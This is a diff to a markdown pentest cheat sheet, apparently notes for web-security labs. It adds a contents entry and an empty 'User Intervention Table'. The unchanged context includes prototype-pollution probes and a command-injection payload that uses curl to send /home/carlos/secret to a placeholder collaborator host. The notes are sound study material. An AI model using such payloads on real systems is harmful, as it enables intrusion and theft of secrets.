@@ -2,6 +2,7 @@
 1. [Initial Access](#initial-access)
 2. [Privilege Escalation](#privilege-escalation)
 3. [System Access](#system-access)
+4. [User Intervention Table](#user-intervention-table)
 
 
 # Initial Access
@@ -205,3 +206,12 @@
 - See if any JSON data is being sent
     - Check for prototype pollution with `"__proto__": { "json spaces":10 }` or `"constructor": { "prototype": { "json spaces":10 } }`
         -Command injection: `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl -X POST <your-collaborator> -d @/home/carlos/secret')" ] }`
+
+---
+
+# User Intervention Table
+
+| Requires user intervention | Does not require user intervention |
+| :--- | :--- |
+| **Initial Access** ||
+
